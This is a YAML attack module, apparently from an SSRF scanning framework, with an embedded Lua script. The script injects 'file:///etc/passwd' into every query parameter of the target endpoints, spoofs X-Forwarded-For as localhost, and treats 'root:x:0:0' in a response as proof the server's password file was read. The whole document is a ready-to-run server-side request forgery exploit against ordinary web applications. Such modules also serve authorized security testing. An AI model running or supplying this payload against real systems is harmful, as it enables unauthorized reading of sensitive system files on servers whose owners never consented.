# 25. file_etc_passwd.yaml
meta:
  id: file_etc_passwd
  version: 2
  name: "File Protocol /etc/passwd"
  description: "Reads /etc/passwd using file://"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 90
  confidence: 80
  severity: critical
  tags: [file, local, read]
  references: []
  success_indicator:
    - "literal:root:x:0:0"
  failure_indicator:
    - "literal:no such file"
    - "literal:cannot open"
    - "literal:<html"
    - "literal:<!DOCTYPE"

match:
  schemes: [http, https, file]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}
        local payload_vector = "file:///etc/passwd"
        local host_value = "localhost"  -- or empty
        for _, target in ipairs(targets) do
            local base_url = target.url
            for _, param in ipairs(target.params) do
                local new_url = base_url
                if param.location == "Query" then
                    local pattern = param.name .. "=[^&]*"
                    local replacement = param.name .. "=" .. payload_vector
                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end
                end
                table.insert(results, {
                    url = new_url,
                    method = target.method or "GET",
                    headers = { ["X-Forwarded-For"] = host_value },
                })
            end
        end
        return results
    end
